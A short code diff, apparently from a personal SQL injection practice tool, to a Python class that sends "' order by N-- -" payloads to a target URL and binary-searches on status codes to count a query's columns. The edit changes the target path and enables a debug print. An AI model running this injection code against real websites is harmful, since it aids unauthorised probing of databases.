@@ -49,7 +49,7 @@ class Columns:
             print(Fore.RED, "[-] Something went wrong lmao", Style.RESET_ALL)
 
     def encode_url(self, counter) -> str:
-        return f"{self.__url}filter?{self.__param}=" + urllib.parse.quote("' order by ") + f"{counter}" + urllib.parse.quote("-- -")
+        return f"{self.__url}product?{self.__param}=" + urllib.parse.quote("' order by ") + f"{counter}" + urllib.parse.quote("-- -")
 
     def make_request(self, url) -> int:
         response = requests.get(url) 
@@ -59,7 +59,7 @@ class Columns:
         tmp_val = self.__amount//2
         while True:
             status_code = self.make_request(self.encode_url(self.__amount))
-            # print(f"Status code: {status_code}\nAmount: {self.__amount}\nTmp_val: {tmp_val}\n")
+            print(f"Status code: {status_code}\nAmount: {self.__amount}\nTmp_val: {tmp_val}\n")
             if status_code != 200:
                 tmp_val = 1 if tmp_val//2 == 0 else tmp_val//2
                 self.__amount -= tmp_val
